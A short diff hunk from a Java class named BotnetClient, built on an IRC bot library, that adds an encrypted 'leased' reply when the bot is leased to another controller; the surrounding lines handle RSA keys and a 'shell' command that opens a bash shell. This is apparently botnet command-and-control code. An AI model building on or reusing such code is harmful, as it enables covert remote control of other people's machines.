@@ -294,6 +294,7 @@ public class BotnetClient extends PircBot {
 						this.leaseMaster = leaseMaster;
 						leasedM = MsgEncrypt.getInstance();
 						leasedM.genRSAPubKey(mod + " " + exp);
+						chat.sendLine(m.encryptMsg("leased"));
 						System.out.println("leased to " + leaseMaster + " with " + leasedM.getRSAPub());
 					} else if (m.decryptMsg(command).startsWith("shell")) {
 						//Create the bash shell
